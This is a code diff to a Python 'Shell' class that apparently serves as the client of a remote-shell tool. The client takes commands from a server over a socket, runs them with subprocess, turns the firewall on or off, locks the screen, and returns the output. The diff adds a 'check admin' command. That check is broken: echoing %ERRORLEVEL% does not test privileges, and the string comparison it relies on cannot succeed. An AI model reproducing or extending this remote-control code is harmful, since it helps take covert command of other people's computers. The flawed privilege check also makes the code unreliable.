@@ -52,9 +52,15 @@ class Shell:
                 if data == "firewall on":
                     data = "netsh advfirewall set currentprofile state on"
 
+                # Locks the screen of client
                 if data == "lock":
                     ctypes.windll.user32.LockWorkStation()
                     data = "echo Screen locked"
+                    
+                # Checks if client has admin rights
+                if data == "check admin":
+                    check_admin_flag = True
+                    data = "echo %ERRORLEVEL%"
 
                 if len(data) > 0:
                     # Executes arbitrary command
@@ -62,6 +68,16 @@ class Shell:
                                             stdin=subprocess.PIPE)
                     stdout_value = proc.stdout.read() + proc.stderr.read()
                     output_str = str(stdout_value, "UTF-8")
+                    
+                    # To check if user has admin privileges
+                    if check_admin_flag:
+                        if output_str == "0":
+                            output_str = "You ARE an administrator"
+                        else:
+                            output_str = "You are NOT an administrator"
+                        
+                        # Reset flag
+                        check_admin_flag = False
 
                     # Sends output back to server
                     self.sock.send(str.encode("\n" + output_str))
